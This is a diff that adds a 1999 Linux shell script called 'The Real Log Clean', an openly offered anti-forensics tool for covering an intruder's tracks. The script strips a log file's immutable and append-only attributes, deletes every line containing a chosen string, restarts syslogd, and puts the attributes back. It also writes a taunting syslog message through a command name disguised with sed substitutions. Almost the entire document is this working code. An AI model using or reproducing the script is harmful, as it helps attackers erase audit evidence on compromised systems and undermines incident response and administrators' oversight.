@@ -1,0 +1,49 @@
+#!/bin/sh
+## The Real Log Clean for Linux OS - It's a New Age for script kiddies.
+## Why "The Real Log Clean"? Coz it's test the attributs in Ext2fs! =)
+## Developed By:
+## Cassiano Aquino<cassiano@wwsecurity.net>
+## Nelson Brito<nelson@sekure.org>
+## some variables used by script
+eleet="Hi Baby, it's a new age from $2!";
+kid="rikkax";
+## something more interesting to kewl kiddies, hei NFO team, learn...
+kid=`echo $kid | sed -e 's/a/e/' -e 's/i/o/' -e 's/r/l/' -e 's/k/g/' \
+-e 's/x/r/' -e 's/k/g/'`;
+## th3 l33t'5 t3k1n1k3 (%$@#$$$!%%@^^#&&$**@^%%!^$%@%!)
+## yeah, I know it's stupid, but who cares?!?! it's work!!! ;))
+checkAttr(){
+RetCode=
+FileAttr=`lsattr $@ | awk '{print $1}'`;
+for Counter in 0 1 2 3 4 5 6 7 
+do
+	case `echo $FileAttr | cut -b $[$Counter+1]-$[$Counter+1]` in
+		A ) RetCode="$RetCode""A";;
+		S ) RetCode="$RetCode""S";;
+		a ) RetCode="$RetCode""a";;
+		c ) RetCode="$RetCode""c";;
+		d ) RetCode="$RetCode""d";;
+		i ) RetCode="$RetCode""i";;
+		s ) RetCode="$RetCode""s";;
+		u ) RetCode="$RetCode""u";;
+	esac
+done
+}
+## fuck, bastard arg test... =))
+if [ $# -eq 3 ]; then
+	checkAttr $3/$1;
+	chattr -$RetCode $3/$1 2> /dev/null;
+	mv $3/$1 $3/$1.$$ && grep -v $2 $3/$1.$$ > $3/$1;
+	rm -f $3/$1.$$;
+	killall -HUP syslogd;
+	$kid -t $0[$$] "$eleet" ## say hi sysdenial... kid...
+	chattr +$RetCode $3/$1 2> /dev/null ;
+elif [ $# -ne 3 ]; then
+	echo "The Real Log Clean for Linux By Cassiano & Nelson";
+	echo "Copyright (c) - 1999 - WWSecurity & Sekure SDI";
+	echo "Use:     $0 <log-file> <string> <directory>";
+	echo "Example: $0 messages dumbass /var/adm";
+	exit 1;
+fi
+## that's all folks... happy new year...
+## ^D ^C EOF
